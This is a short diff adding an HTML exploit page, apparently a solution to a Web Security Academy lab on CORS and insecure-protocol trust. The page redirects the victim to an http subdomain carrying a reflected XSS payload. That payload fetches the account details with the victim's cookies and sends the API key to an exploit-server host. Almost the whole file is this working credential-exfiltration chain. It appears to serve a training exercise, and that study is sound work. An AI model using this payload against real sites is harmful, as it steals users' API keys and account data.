@@ -1,0 +1,6 @@
+<!--
+    document.location is better than fetch when dealing with differant protocols, e.g. http vs https
+-->
+<script>
+    document.location = "http://stock.0aa300f3046cc51ec1b04e0f001d000d.web-security-academy.net/?productId=12<script>fetch('https%3a//0aa300f3046cc51ec1b04e0f001d000d.web-security-academy.net/accountDetails',+{credentials%3a'include'}).then(r+%3d>+r.json()).then(j+%3d>+fetch('https%3a//exploit-0ad700fb048fc552c14d4d5701ae0087.exploit-server.net/admin%3fkey%3d'%2bj.apikey))%3c/script>&storeId=1"
+</script>
